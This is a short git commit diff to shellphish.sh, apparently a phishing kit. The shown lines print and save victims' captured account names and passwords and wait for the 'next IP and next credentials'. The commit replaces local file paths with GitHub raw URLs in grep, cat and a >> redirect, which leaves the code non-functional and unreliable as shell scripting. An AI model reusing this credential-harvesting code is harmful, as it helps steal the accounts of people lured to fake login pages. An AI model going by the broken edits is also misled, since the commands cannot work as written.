17d9b4ad495ba9316b9db0816e20f569d9fd62b1
xhabibx <anehhell@gmail.com>
2018-11-13 08:56:06 +0700

    Great

--- shellphish.sh
+++ shellphish.sh
@@ -202,7 +202,7 @@ IFS=$'\n'
 password=$(grep -o 'Pass:.*' https://raw.githubusercontent.com/xhabibx/pishingHB/master/sites/$server/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat https://raw.githubusercontent.com/xhabibx/pishingHB/master/sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+cat https://raw.githubusercontent.com/xhabibx/pishingHB/master/sites/$server/usernames.txt >> https://raw.githubusercontent.com/xhabibx/pishingHB/master/sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 printf "\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...\e[0m\n"
